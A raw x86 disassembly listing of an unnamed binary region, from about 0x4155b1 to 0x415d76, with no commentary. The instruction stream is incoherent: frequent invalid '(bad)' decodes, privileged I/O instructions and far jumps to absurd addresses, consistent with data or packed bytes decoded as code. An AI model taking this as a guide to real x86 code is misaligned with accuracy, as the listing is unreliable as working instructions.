  4155b1:	sub    BYTE PTR [esp+ebp*2-0x15c815aa],bh
  4155b8:	das    
  4155b9:	adc    ecx,edx
  4155bb:	mov    WORD PTR [esi],cs
  4155bd:	ins    DWORD PTR es:[edi],dx
  4155be:	dec    esi
  4155bf:	jl     0x415566
  4155c1:	xchg   BYTE PTR [ebx+eiz*4+0xa],dl
  4155c5:	jecxz  0x4155c3
  4155c7:	stos   BYTE PTR es:[edi],al
  4155c8:	hlt    
  4155c9:	fmul   QWORD PTR [ebx]
  4155cb:	dec    edx
  4155cc:	sbb    BYTE PTR [eax],0xc8
  4155cf:	int3   
  4155d0:	pop    ebp
  4155d1:	jno    0x415634
  4155d3:	fwait
  4155d4:	rcl    BYTE PTR [ebx-0x80],1
  4155d7:	and    BYTE PTR [edx],ch
  4155d9:	loopne 0x415567
  4155db:	loope  0x415642
  4155dd:	jmp    0x6f338c12
  4155e2:	lock or dh,cl
  4155e5:	mov    bh,0x7e
  4155e7:	fnstcw WORD PTR [esi]
  4155e9:	or     bl,BYTE PTR [esi]
  4155eb:	repz sar DWORD PTR [ebp-0x19],0xfc
  4155f0:	push   esi
  4155f1:	ins    DWORD PTR es:[edi],dx
  4155f2:	xchg   esp,eax
  4155f3:	ror    esi,cl
  4155f5:	popf   
  4155f6:	fst    st(0)
  4155f8:	outs   dx,BYTE PTR ds:[esi]
  4155f9:	stc    
  4155fa:	outs   dx,BYTE PTR ds:[esi]
  4155fb:	jle    0x41564a
  4155fd:	mov    eax,0x98897a4d
  415602:	adc    eax,0x80018fc1
  415607:	pop    ss
  415608:	inc    eax
  415609:	cwde   
  41560a:	sbb    eax,0x917c8cf9
  41560f:	enter  0xc31e,0x16
  415613:	mov    esp,0xf746f38f
  415618:	les    ecx,FWORD PTR [ebx+0x1e]
  41561b:	or     eax,0x6182d445
  415620:	out    dx,al
  415621:	cmp    DWORD PTR [eax-0xe],0xa
  415625:	adc    al,0x7d
  415627:	sbb    eax,0xc0fe326e
  41562c:	jl     0x4155fd
  41562e:	dec    ebp
  41562f:	jmp    0x29c8:0xb163133c
  415636:	adc    cl,al
  415638:	lods   al,BYTE PTR ds:[esi]
  415639:	inc    ecx
  41563a:	pop    ecx
  41563b:	jnp    0x415684
  41563d:	je     0x415696
  41563f:	mov    ecx,0xd4448e77
  415644:	test   BYTE PTR [esi+0x3881cf0c],dl
  41564a:	cwde   
  41564b:	jne    0x4156a3
  41564d:	sbb    esi,0xffffffdb
  415650:	fcomp  DWORD PTR [eax-0x3ed720f9]
  415656:	(bad)  
  415657:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415658:	int3   
  415659:	popf   
  41565a:	cmp    BYTE PTR [esi+eax*1],bl
  41565d:	mov    ds:0xe8f3ec32,eax
  415662:	fcmovne st,st(0)
  415664:	gs xor eax,0xbbec79fd
  41566a:	jge    0x415657
  41566c:	mov    dl,0x34
  41566e:	test   DWORD PTR [ecx],esp
  415670:	xchg   ecx,eax
  415671:	outs   dx,DWORD PTR ds:[esi]
  415672:	jne    0x4156bc
  415674:	mov    eax,0xdf46e557
  415679:	jno    0x4156bc
  41567b:	ror    BYTE PTR [ebx-0x77],cl
  41567e:	das    
  41567f:	or     eax,DWORD PTR [ebx+esi*1]
  415682:	cmp    DWORD PTR [edi],eax
  415684:	mov    ds:0xefad413e,al
  415689:	js     0x4156e5
  41568b:	pop    ds
  41568c:	ret    0x5db
  41568f:	cdq    
  415690:	int    0x5e
  415692:	stos   DWORD PTR es:[edi],eax
  415693:	sahf   
  415694:	aad    0x1f
  415696:	cmp    eax,0xd4edc65
  41569b:	mov    ds:0x282c42fc,al
  4156a0:	jmp    0x13c0:0xe224e0f7
  4156a7:	(bad)  
  4156a8:	aad    0x6e
  4156aa:	jcxz   0x41565f
  4156ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156ae:	out    0xef,al
  4156b0:	shl    DWORD PTR [edi+0xf078b08],1
  4156b6:	(bad)  
  4156b7:	hlt    
  4156b8:	xchg   ecx,eax
  4156b9:	jne    0x41563c
  4156bb:	xchg   edx,eax
  4156bc:	imul   ebx,esp,0xd3e42651
  4156c2:	inc    esp
  4156c3:	sahf   
  4156c4:	stc    
  4156c5:	mov    ?,WORD PTR [ecx+0x68ec8da1]
  4156cb:	fmul   QWORD PTR [ebp-0x18]
  4156ce:	sti    
  4156cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156d0:	mov    ecx,0x7db6fbb5
  4156d5:	rcr    BYTE PTR [eax],1
  4156d7:	in     al,dx
  4156d8:	adc    ebx,0xfd97f165
  4156de:	or     al,0xa0
  4156e0:	cli    
  4156e1:	(bad)  
  4156e2:	test   eax,0xfc9de8e0
  4156e7:	in     al,dx
  4156e8:	push   ebp
  4156e9:	test   eax,0x10c92935
  4156ee:	leave  
  4156ef:	(bad)  
  4156f0:	ds (bad) 
  4156f3:	leave  
  4156f4:	retf   
  4156f5:	or     eax,0x959765ca
  4156fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156fb:	fisttp WORD PTR [esi-0x4]
  4156fe:	add    edi,DWORD PTR [esi+ebp*1+0x6a]
  415702:	cli    
  415703:	ret    0x8d48
  415706:	into   
  415707:	js     0x4156d1
  415709:	jecxz  0x4156a6
  41570b:	adc    ebx,ecx
  41570d:	into   
  41570e:	das    
  41570f:	mov    bh,0x6f
  415711:	shl    ch,cl
  415713:	or     ebx,DWORD PTR [eax]
  415715:	das    
  415716:	and    bh,bl
  415718:	lds    eax,FWORD PTR [esi]
  41571a:	cwde   
  41571b:	das    
  41571c:	jmp    0x2c896517
  415721:	test   eax,0x3a691f41
  415726:	pop    eax
  415727:	adc    al,0xa8
  415729:	cwde   
  41572a:	mov    eax,0x4f571360
  41572f:	std    
  415730:	jg     0x415752
  415732:	dec    ebx
  415733:	(bad)  
  415734:	mov    ah,0xbd
  415736:	pop    ebp
  415737:	xchg   esp,eax
  415738:	add    BYTE PTR [ecx-0x1b1db53c],dh
  41573e:	or     esp,DWORD PTR [esi+0x44]
  415741:	dec    esi
  415742:	cmp    BYTE PTR [ebx+0x51],dl
  415745:	xchg   BYTE PTR [esi],ah
  415747:	gs mov eax,edx
  41574a:	sub    al,0x81
  41574c:	popf   
  41574d:	test   eax,0x266c8956
  415752:	imul   BYTE PTR [esi]
  415754:	sbb    ecx,DWORD PTR ds:0xc70beb
  41575a:	jae    0x4156f4
  41575c:	push   esi
  41575d:	in     al,dx
  41575e:	sar    DWORD PTR [ebp+0x6a],cl
  415761:	sbb    bl,BYTE PTR [ebx-0x26721e8d]
  415767:	(bad)  
  415768:	loope  0x4157be
  41576a:	push   cs
  41576b:	and    al,0xbb
  41576d:	(bad)  
  41576f:	mov    ah,0x39
  415771:	lods   eax,DWORD PTR ds:[esi]
  415772:	not    DWORD PTR [edi+0x52]
  415775:	lock pop esp
  415777:	sti    
  415778:	or     bl,BYTE PTR ds:0x57f96cbe
  41577e:	inc    esi
  41577f:	mov    eax,ds:0x9f23d1f
  415784:	and    ecx,DWORD PTR [edi+0x42]
  415787:	fcompp 
  415789:	xchg   edx,eax
  41578a:	jp     0x415722
  41578c:	lods   al,BYTE PTR ds:[esi]
  41578d:	and    DWORD PTR [edx+ebx*1+0x2af7285a],esi
  415794:	jmp    0x415762
  415796:	out    0xc4,al
  415798:	cmp    BYTE PTR [edx-0x19],ch
  41579b:	mov    ebp,0x587a92e0
  4157a0:	or     cl,ch
  4157a2:	mov    esi,0xf2ae4bd1
  4157a7:	out    0x10,al
  4157a9:	push   ecx
  4157aa:	out    dx,eax
  4157ab:	adc    DWORD PTR [esp+ecx*4-0x6c],ebp
  4157af:	mov    eax,DWORD PTR [edx]
  4157b1:	jmp    0xb145:0xa062cd4b
  4157b8:	mov    ecx,0x10fdb93c
  4157bd:	test   DWORD PTR [ecx-0x39b4245f],ebp
  4157c3:	xchg   ecx,eax
  4157c4:	jl     0x415762
  4157c6:	or     ebx,DWORD PTR [eax]
  4157c8:	pop    ecx
  4157c9:	addr16 inc esi
  4157cb:	(bad)  
  4157cc:	and    BYTE PTR [edx-0x4e],al
  4157cf:	push   ebx
  4157d0:	dec    ebx
  4157d1:	cmp    DWORD PTR [edx-0x23],ebx
  4157d4:	push   edi
  4157d5:	pop    ebp
  4157d6:	pop    ebp
  4157d7:	add    ebp,ebx
  4157d9:	xchg   DWORD PTR [edi],ebx
  4157db:	add    cl,BYTE PTR [edi-0x59a1cd34]
  4157e1:	xchg   ecx,edi
  4157e3:	add    al,BYTE PTR [edi-0x44]
  4157e6:	sub    al,0xbb
  4157e8:	cmp    al,0xcd
  4157ea:	(bad)  
  4157eb:	cmp    al,0x15
  4157ed:	dec    edx
  4157ee:	or     al,0xed
  4157f0:	add    BYTE PTR [edi+0x1499540a],0x43
  4157f7:	aas    
  4157f8:	(bad)  
  4157f9:	cmc    
  4157fa:	lea    edi,[edi+0x36]
  4157fd:	das    
  4157fe:	mov    es,WORD PTR [ebx+0x47252ef2]
  415804:	sub    BYTE PTR [ebp+0x13179918],cl
  41580a:	jnp    0x4157da
  41580c:	into   
  41580d:	jnp    0x415792
  41580f:	xchg   edi,eax
  415810:	lock sar BYTE PTR [edi+0x4],1
  415814:	popf   
  415815:	jae    0x4157f6
  415817:	leave  
  415818:	dec    ebx
  415819:	inc    esi
  41581a:	in     eax,dx
  41581b:	out    0x63,al
  41581d:	aam    0xb3
  41581f:	jl     0x4157e8
  415821:	pop    edx
  415822:	xor    ebx,ecx
  415824:	mov    ds:0x765cbde7,al
  415829:	jnp    0x41587d
  41582b:	je     0x415826
  41582d:	jb     0x415873
  41582f:	pop    ss
  415830:	cmp    eax,DWORD PTR [eax+0x8952661]
  415836:	(bad)  
  415837:	xlat   BYTE PTR ds:[ebx]
  415838:	rcr    DWORD PTR [ecx+ebp*4-0x8c12af],cl
  41583f:	loop   0x415801
  415841:	clc    
  415842:	mov    esi,DWORD PTR [ecx+0x51]
  415845:	stos   DWORD PTR es:[edi],eax
  415846:	mov    edi,DWORD PTR [ecx]
  415848:	jne    0x4158bf
  41584a:	sub    al,0xdf
  41584c:	into   
  41584d:	call   DWORD PTR [ecx-0x3c]
  415850:	push   cs
  415851:	cmp    DWORD PTR ds:0xa2721f46,0xf7cd24ed
  41585b:	or     DWORD PTR [edi+0x6e],edx
  41585e:	and    DWORD PTR [esi],ebp
  415860:	mov    ch,0xaa
  415862:	add    eax,0x2d7478bf
  415867:	jno    0x4158d9
  415869:	(bad)  [eax-0x777c320f]
  41586f:	in     al,0xbb
  415871:	inc    esi
  415872:	shr    DWORD PTR [ebp-0x7d],0x96
  415876:	sbb    edi,eax
  415878:	stos   BYTE PTR es:[edi],al
  415879:	cmp    ah,0xe8
  41587c:	dec    edi
  41587d:	pop    edi
  41587e:	repz scas al,BYTE PTR es:[edi]
  415880:	fld    DWORD PTR [ebp+0x50]
  415883:	pop    ss
  415884:	push   edx
  415885:	mov    DWORD PTR [ecx+0x16],ecx
  415888:	and    DWORD PTR [esi+0x7d217d9f],eax
  41588e:	mov    BYTE PTR [esi+0x30],ah
  415891:	sbb    bl,ah
  415893:	fist   DWORD PTR [ecx]
  415895:	sar    DWORD PTR [edx-0x75],cl
  415898:	jns    0x415892
  41589a:	jmp    0x415846
  41589c:	das    
  41589d:	cmp    ah,BYTE PTR [edx-0x19aeefd3]
  4158a3:	add    DWORD PTR [edi],0xf8aa47ed
  4158a9:	xchg   edi,eax
  4158aa:	xchg   BYTE PTR [ebx+0xc],ch
  4158ad:	clc    
  4158ae:	aad    0xf8
  4158b0:	nop
  4158b1:	xor    eax,0xa46784e1
  4158b6:	imul   esi,DWORD PTR [esp+esi*4],0xffffffff
  4158ba:	std    
  4158bb:	aam    0x29
  4158bd:	fnsave [edi]
  4158bf:	jo     0x4158b1
  4158c1:	(bad)  
  4158c2:	pop    esi
  4158c3:	fsubrp st(1),st
  4158c5:	in     eax,0x12
  4158c7:	cmp    BYTE PTR [edx-0x23b89cae],cl
  4158cd:	stos   DWORD PTR es:[edi],eax
  4158ce:	sub    DWORD PTR [eax+eax*8-0x3627232d],edx
  4158d5:	pop    edi
  4158d6:	into   
  4158d7:	fist   DWORD PTR [ebx]
  4158d9:	dec    esi
  4158da:	mov    esi,0x3de5bb19
  4158df:	(bad)  
  4158e0:	and    bh,al
  4158e2:	out    0x44,eax
  4158e4:	xchg   edx,eax
  4158e5:	xor    ebp,esi
  4158e7:	lods   al,BYTE PTR ds:[esi]
  4158e8:	push   es
  4158e9:	outs   dx,BYTE PTR ds:[esi]
  4158ea:	nop
  4158eb:	jl     0x4158ec
  4158ed:	stos   DWORD PTR es:[edi],eax
  4158ee:	inc    esi
  4158ef:	pop    edx
  4158f0:	jecxz  0x41590b
  4158f2:	das    
  4158f3:	mov    ah,0x13
  4158f5:	mov    edi,0xa9a7df4
  4158fa:	inc    esi
  4158fb:	cli    
  4158fc:	retf   
  4158fd:	mov    al,0xfd
  4158ff:	scas   al,BYTE PTR es:[edi]
  415900:	or     esi,DWORD PTR [edx]
  415902:	mov    al,0xce
  415904:	lods   eax,DWORD PTR ds:[esi]
  415905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415906:	scas   eax,DWORD PTR es:[edi]
  415907:	mov    ebx,0x1fdf54d0
  41590c:	inc    eax
  41590d:	pushf  
  41590e:	push   edx
  41590f:	mov    bl,0x59
  415911:	sbb    al,0x24
  415913:	adc    eax,0xbaeb3af6
  415918:	dec    edx
  415919:	ror    ah,0x88
  41591c:	lock push ebx
  41591e:	inc    ecx
  41591f:	and    DWORD PTR [ebx-0x28d4b3bb],0xefbf138e
  415929:	add    ch,BYTE PTR [eax+0x4d]
  41592c:	pop    ds
  41592d:	mov    esp,0x65c11153
  415932:	or     BYTE PTR [ebx+eax*8-0x16],0x87
  415937:	in     al,dx
  415938:	lahf   
  415939:	xchg   ebx,eax
  41593a:	ss call 0xd8ba:0xbf9b6d6b
  415942:	mov    ah,dl
  415944:	pop    edx
  415945:	xchg   edi,eax
  415946:	je     0x41599e
  415948:	mov    BYTE PTR [esi],bh
  41594a:	or     al,0x62
  41594c:	mov    BYTE PTR [esi],dh
  41594e:	test   DWORD PTR [ebp-0x7e95476f],edx
  415954:	mov    DWORD PTR ds:0x19597364,ebp
  41595a:	mov    al,ds:0x43e7502b
  41595f:	daa    
  415960:	iret   
  415961:	stos   BYTE PTR es:[edi],al
  415962:	mov    ch,0x4a
  415964:	cli    
  415965:	pop    ss
  415966:	test   eax,0x46343300
  41596b:	xor    eax,0x40258bba
  415970:	sbb    al,0xfd
  415972:	add    ecx,DWORD PTR [edx-0x1ac1acf8]
  415978:	test   eax,0x75b6d0fb
  41597d:	push   ebx
  41597e:	jmp    0x5157:0x9a900c1d
  415985:	adc    esi,ebp
  415987:	push   0xcab87acb
  41598c:	push   esp
  41598d:	sub    ebp,edx
  41598f:	adc    al,0xdc
  415991:	in     al,dx
  415992:	mov    eax,ds:0x7d2f75dc
  415997:	jmp    0x4159c2
  415999:	adc    al,0xcd
  41599b:	dec    edi
  41599c:	pop    edx
  41599d:	sub    al,0xe2
  41599f:	(bad)  
  4159a0:	dec    bp
  4159a2:	push   edi
  4159a3:	adc    ebp,DWORD PTR [esi-0x25181104]
  4159a9:	jmp    0x415938
  4159ab:	push   esp
  4159ac:	pop    ds
  4159ad:	or     BYTE PTR [esp+edi*4+0x2eeb4be2],cl
  4159b4:	push   cs
  4159b5:	jle    0x41595e
  4159b7:	sub    eax,0x59062eda
  4159bc:	std    
  4159bd:	cmp    ah,BYTE PTR [edx]
  4159bf:	mov    ds:0x7455c2b0,eax
  4159c4:	cmp    eax,0xf8313fe1
  4159c9:	shl    ebx,cl
  4159cb:	sti    
  4159cc:	adc    DWORD PTR [ecx],edi
  4159ce:	pop    ecx
  4159cf:	sub    al,0x4e
  4159d1:	ret    0x8f11
  4159d4:	js     0x4159a9
  4159d6:	inc    ebp
  4159d7:	inc    esi
  4159d8:	push   ss
  4159d9:	pop    esi
  4159da:	inc    esp
  4159db:	inc    esi
  4159dc:	stc    
  4159dd:	xchg   dl,al
  4159df:	cmp    eax,ecx
  4159e1:	stos   BYTE PTR es:[edi],al
  4159e2:	cmp    DWORD PTR [esi-0xd35747],esp
  4159e8:	mov    ecx,0xf0dcfc0b
  4159ed:	jmp    0x3b4d7583
  4159f2:	xchg   ax,ax
  4159f4:	adc    al,0xa
  4159f6:	mov    edx,0xf27ef5a0
  4159fb:	sub    ch,0xba
  4159fe:	ins    DWORD PTR es:[edi],dx
  4159ff:	mov    al,0xad
  415a01:	jae    0x415a41
  415a03:	test   ah,ah
  415a05:	jp     0x415a63
  415a07:	retf   
  415a08:	(bad)  
  415a09:	push   ecx
  415a0a:	outs   dx,DWORD PTR ds:[esi]
  415a0b:	dec    bl
  415a0d:	add    edx,edx
  415a0f:	ret    0x7272
  415a12:	jno    0x415a0e
  415a14:	xchg   esp,eax
  415a15:	xchg   ecx,eax
  415a16:	ficom  DWORD PTR fs:[ebx+0x1404f02]
  415a1d:	(bad)  
  415a1e:	rcr    BYTE PTR [edx+ebp*2],1
  415a21:	mov    edi,0xb959ab0e
  415a26:	adc    bh,BYTE PTR [ecx+0x5e]
  415a29:	scas   al,BYTE PTR es:[edi]
  415a2a:	(bad)
  415a2e:	lea    esi,[edx]
  415a30:	mov    ecx,0xef0c1b9
  415a35:	(bad)  
  415a36:	cmp    al,0xc
  415a38:	mov    ss,edx
  415a3a:	fs jbe 0x415a02
  415a3d:	mov    al,ds:0xb8f5ae35
  415a42:	dec    esi
  415a43:	in     eax,dx
  415a44:	ror    DWORD PTR [edi+0x312e6c9f],0xb9
  415a4b:	pop    esp
  415a4c:	push   ds
  415a4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a4e:	test   dh,0xb
  415a51:	ins    DWORD PTR es:[edi],dx
  415a52:	ret    0x68dd
  415a55:	push   eax
  415a56:	aad    0x91
  415a58:	mov    edx,0x3edc17a
  415a5d:	fistp  QWORD PTR [ecx+eiz*8-0x34]
  415a61:	sahf   
  415a62:	int    0xab
  415a64:	adc    ah,dh
  415a66:	fidiv  DWORD PTR ss:[ebx]
  415a69:	sbb    eax,0x38b31701
  415a6e:	xor    BYTE PTR [ebp-0x3d],bh
  415a71:	cmp    al,0xab
  415a73:	jmp    0x1878:0xd3d78028
  415a7a:	cli    
  415a7b:	xchg   esp,eax
  415a7c:	retf   0x90c7
  415a7f:	fild   DWORD PTR [edi]
  415a81:	dec    ebp
  415a82:	idiv   ebp
  415a84:	retf   0xd720
  415a87:	dec    ecx
  415a88:	xchg   esp,eax
  415a89:	sub    dh,BYTE PTR [esi-0xda5d2c1]
  415a8f:	add    BYTE PTR [ebx+0x53],ch
  415a92:	les    edx,FWORD PTR [bp+0x37fb]
  415a97:	adc    al,0x6
  415a99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a9a:	xchg   ch,ch
  415a9c:	mov    ds:0x69a4e075,al
  415aa1:	repz repz shl ch,1
  415aa5:	bound  ebx,QWORD PTR [ebx+eax*8-0x759aff3e]
  415aac:	inc    esp
  415aad:	sub    DWORD PTR [ecx],ebp
  415aaf:	je     0x415b21
  415ab1:	iret   
  415ab2:	xchg   esi,eax
  415ab3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ab4:	xor    al,0xd3
  415ab7:	inc    ecx
  415ab8:	xor    esi,DWORD PTR [ebp+0x3ff50243]
  415abe:	mov    dl,0xfb
  415ac0:	scas   eax,DWORD PTR es:[edi]
  415ac1:	or     BYTE PTR [ebx],dh
  415ac3:	inc    edi
  415ac4:	pop    edi
  415ac5:	mov    eax,0x867cd00d
  415aca:	shr    DWORD PTR [ebp-0x65ca7d8b],cl
  415ad0:	out    0x8d,al
  415ad2:	sbb    DWORD PTR [ecx-0x78ade9a9],eax
  415ad8:	add    DWORD PTR [esi+0x5e0b7775],edx
  415ade:	ror    DWORD PTR [eax-0x5a2b1d03],0x81
  415ae5:	test   BYTE PTR [esi],dl
  415ae7:	push   ds
  415ae8:	sub    al,0xed
  415aea:	ins    BYTE PTR es:[edi],dx
  415aeb:	or     DWORD PTR [ebx],ebp
  415aed:	mov    edi,0x233ea36a
  415af2:	mov    cl,bh
  415af4:	push   edx
  415af5:	push   ecx
  415af6:	ds popa 
  415af8:	xlat   BYTE PTR ds:[ebx]
  415af9:	ret    
  415afa:	sahf   
  415afb:	sbb    BYTE PTR [edx],0x11
  415afe:	ret    
  415aff:	cwde   
  415b00:	call   esp
  415b02:	test   eax,0x5bad928c
  415b07:	push   cs
  415b08:	pop    edi
  415b09:	daa    
  415b0a:	jmp    0x6830:0xf8b18456
  415b11:	adc    BYTE PTR [ebp+0x2d65b86f],ah
  415b17:	push   edx
  415b18:	stos   BYTE PTR es:[edi],al
  415b19:	fcomp  QWORD PTR [eax]
  415b1b:	dec    ecx
  415b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b1d:	clc    
  415b1e:	into   
  415b1f:	mov    esp,0x14358b2a
  415b24:	ins    DWORD PTR es:[edi],dx
  415b25:	scas   al,BYTE PTR es:[edi]
  415b26:	add    eax,DWORD PTR [ebx]
  415b28:	sti    
  415b29:	adc    eax,0xb8b0e288
  415b2e:	and    DWORD PTR [ecx],0x85e0b6de
  415b34:	mov    edx,0xca2f4045
  415b39:	retf   0x524b
  415b3c:	push   ecx
  415b3d:	add    al,0xbf
  415b3f:	icebp  
  415b40:	sbb    eax,0x813a9d3f
  415b45:	cmp    edi,eax
  415b47:	dec    ebx
  415b48:	pop    es
  415b49:	sub    esi,ebx
  415b4b:	and    eax,0xe0a45446
  415b50:	inc    ebx
  415b51:	outs   dx,WORD PTR ds:[esi]
  415b53:	push   ecx
  415b54:	aad    0x99
  415b56:	(bad)  
  415b57:	xchg   esi,eax
  415b58:	cmp    DWORD PTR [esi-0x65],ebx
  415b5b:	xchg   ecx,eax
  415b5c:	mov    edx,0x201fb15f
  415b61:	pop    edx
  415b62:	outs   dx,DWORD PTR ds:[esi]
  415b63:	call   0xa0b2:0x8cdea276
  415b6a:	pop    edx
  415b6b:	add    edi,ebp
  415b6d:	sub    BYTE PTR [ecx],dh
  415b6f:	adc    DWORD PTR [eax+esi*2-0x3b],eax
  415b73:	rol    DWORD PTR [eax],cl
  415b75:	ror    BYTE PTR [edx],cl
  415b77:	push   ebp
  415b78:	add    DWORD PTR [ecx-0x1935afc2],edx
  415b7e:	sti    
  415b7f:	mov    esp,0xa3a3c85e
  415b84:	cmp    DWORD PTR [eax],esp
  415b86:	jp     0x415bc9
  415b88:	jge    0x415b99
  415b8a:	stos   DWORD PTR es:[edi],eax
  415b8b:	mov    eax,ds:0x20c693c0
  415b90:	sbb    BYTE PTR [edx],al
  415b92:	push   cs
  415b93:	xchg   DWORD PTR [eax],eax
  415b95:	push   ss
  415b96:	fwait
  415b97:	iret   
  415b98:	fbld   TBYTE PTR [eax-0x752ceff1]
  415b9e:	aam    0x3c
  415ba0:	add    al,0x1e
  415ba2:	adc    DWORD PTR [ebx-0x55eab342],edi
  415ba8:	addr16 es mov ebp,0xfa5a2951
  415baf:	and    DWORD PTR ds:0xf9d4b552,edx
  415bb5:	or     bh,dl
  415bb7:	jno    0x415c2b
  415bb9:	cdq    
  415bba:	stos   DWORD PTR es:[edi],eax
  415bbb:	mov    ?,WORD PTR [esi-0x3cb318ce]
  415bc1:	rol    DWORD PTR [ebx-0x56],1
  415bc4:	aas    
  415bc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bc6:	push   es
  415bc7:	add    esp,DWORD PTR [esp+ecx*4]
  415bca:	sub    al,0xb0
  415bcc:	fwait
  415bcd:	jge    0x415b66
  415bcf:	push   eax
  415bd0:	neg    DWORD PTR [edx+ecx*1-0x19]
  415bd4:	jbe    0x415c37
  415bd6:	and    ah,BYTE PTR [esi+0x5058077]
  415bdc:	data16 jl 0x415b6f
  415bdf:	push   cs
  415be0:	js     0x415b71
  415be2:	gs adc eax,0x1bbd1f81
  415be8:	mov    eax,ds:0xb12e1ae9
  415bed:	and    dl,BYTE PTR [ecx+0x6f]
  415bf0:	dec    esi
  415bf1:	cmp    cl,dl
  415bf3:	(bad)  
  415bf4:	xor    eax,0x43fa7216
  415bf9:	popa   
  415bfa:	cld    
  415bfb:	or     BYTE PTR [ebx],dl
  415bfd:	dec    ebx
  415bfe:	jo     0x415c77
  415c00:	mov    BYTE PTR [eax+0x72de733f],bl
  415c06:	sahf   
  415c07:	into   
  415c08:	cmp    edx,DWORD PTR [eax]
  415c0a:	mov    ebx,0x99cd62f6
  415c0f:	out    0xe7,al
  415c11:	push   0xffffffd7
  415c13:	adc    dl,BYTE PTR [esi]
  415c15:	shl    BYTE PTR [edi-0x7fcccf8d],1
  415c1b:	cwde   
  415c1c:	mov    bh,0xbf
  415c1e:	arpl   WORD PTR [ebx],di
  415c20:	int    0xbc
  415c22:	leave  
  415c23:	mov    esi,0xa0121470
  415c28:	rcl    DWORD PTR [ecx],cl
  415c2a:	popa   
  415c2b:	push   edi
  415c2c:	ret    0xde9e
  415c2f:	clc    
  415c30:	fcomp  DWORD PTR [ebx+edi*8+0x761a7d9c]
  415c37:	pop    ebp
  415c38:	pusha  
  415c39:	shl    ah,1
  415c3b:	popf   
  415c3c:	jno    0x415be1
  415c3e:	mov    esi,0xef94570
  415c43:	cmp    bh,BYTE PTR [edi-0x8]
  415c46:	cld    
  415c47:	shl    DWORD PTR [ecx+0x46d020b3],cl
  415c4d:	adc    eax,0x91054a98
  415c52:	pop    eax
  415c53:	rol    BYTE PTR [edx+0x5f36656b],1
  415c59:	jnp    0x415c5d
  415c5b:	dec    esi
  415c5c:	cmc    
  415c5d:	js     0x415c27
  415c5f:	add    eax,0x42b15132
  415c64:	and    eax,0x4eff1cb6
  415c69:	xchg   edi,eax
  415c6a:	pop    es
  415c6b:	mov    esp,0x33badba1
  415c70:	cs loop 0x415bf6
  415c73:	enter  0x8772,0x44
  415c77:	ror    BYTE PTR [edi-0x4b],0xb
  415c7b:	mov    ebp,0xf636552
  415c80:	fcmovb st,st(1)
  415c82:	fs (bad) 
  415c84:	mov    WORD PTR [ecx+0x58bbba03],?
  415c8a:	fwait
  415c8b:	push   eax
  415c8c:	or     esi,edx
  415c8e:	lea    esp,[edi-0x1123e22e]
  415c94:	inc    eax
  415c95:	and    BYTE PTR [edx-0x79d2c550],0xd9
  415c9c:	retf   
  415c9d:	sar    DWORD PTR [eax-0x79],cl
  415ca0:	pop    ebx
  415ca1:	sbb    eax,0x7f5efa4d
  415ca6:	cdq    
  415ca7:	pop    DWORD PTR [edi+0x4ce41fdf]
  415cad:	push   ds
  415cae:	sub    DWORD PTR [ebp-0x2f],esi
  415cb1:	arpl   WORD PTR [esi+0x571920d8],di
  415cb7:	mov    edi,0xc2e693fd
  415cbc:	and    DWORD PTR [esi],esp
  415cbe:	mov    WORD PTR [ecx],gs
  415cc0:	mov    bh,0xb5
  415cc2:	pop    edx
  415cc3:	(bad)  
  415cc4:	jg     0x415d30
  415cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cc7:	mov    DWORD PTR [ebp+eiz*4+0x763beb85],eax
  415cce:	out    0x9c,al
  415cd0:	sub    ah,ah
  415cd2:	xchg   DWORD PTR [ebp+0x2ac1fc22],ebx
  415cd8:	test   BYTE PTR [edx+0x7ca9a4c9],ah
  415cde:	int3   
  415cdf:	stos   DWORD PTR es:[edi],eax
  415ce0:	mov    al,0x4e
  415ce2:	ret    0x5411
  415ce5:	gs mov bl,0xae
  415ce8:	ins    BYTE PTR es:[edi],dx
  415ce9:	in     al,dx
  415cea:	clc    
  415ceb:	jo     0x415ccf
  415ced:	mov    BYTE PTR [bp+di+0x2d89],dh
  415cf2:	pop    esp
  415cf3:	das    
  415cf4:	push   ds
  415cf5:	(bad)  
  415cf6:	and    eax,0x6543f94d
  415cfb:	jb     0x415c81
  415cfd:	add    ecx,esp
  415cff:	jbe    0x415cd8
  415d01:	dec    ecx
  415d02:	mov    ah,0x81
  415d04:	idiv   BYTE PTR [edx-0x34]
  415d07:	and    ebp,eax
  415d09:	call   DWORD PTR [edi+0x4b]
  415d0c:	xchg   edi,ebp
  415d0e:	in     eax,0x7d
  415d10:	pop    edx
  415d11:	jmp    0x210ec264
  415d16:	adc    BYTE PTR [ecx-0x71],0x68
  415d1a:	jne    0x415d8d
  415d1c:	mov    BYTE PTR [esi],dh
  415d1e:	or     al,0xdc
  415d20:	mov    edx,0xabf97dea
  415d25:	mov    dl,0x52
  415d27:	cmp    bl,BYTE PTR [ebx+edi*2+0x71b44ad0]
  415d2e:	mov    al,0xb0
  415d30:	mov    al,ds:0xf5660910
  415d35:	inc    esp
  415d36:	sbb    BYTE PTR [ecx],ch
  415d38:	cmp    BYTE PTR [ebp+0x407f7a8],ch
  415d3e:	and    BYTE PTR [eax+eiz*2+0x30110ef8],0xae
  415d46:	leave  
  415d47:	(bad)  
  415d48:	jno    0x415d16
  415d4a:	pop    esi
  415d4b:	rcr    bl,1
  415d4d:	loop   0x415d3f
  415d4f:	or     BYTE PTR [edi-0x1e],dh
  415d52:	sbb    bh,BYTE PTR [ebp-0x390a34e]
  415d58:	call   ebx
  415d5a:	xor    bh,BYTE PTR [eax+0x780834b8]
  415d60:	(bad)
  415d63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d64:	sub    DWORD PTR [edi],edx
  415d66:	arpl   di,sp
  415d68:	xor    DWORD PTR [eax-0x4d],esi
  415d6b:	aaa    
  415d6c:	ss cs dec edi
  415d6f:	pop    eax
  415d70:	xor    DWORD PTR [ebp+0x3b3b8aa7],esp
  415d76:	xchg   ebp,eax
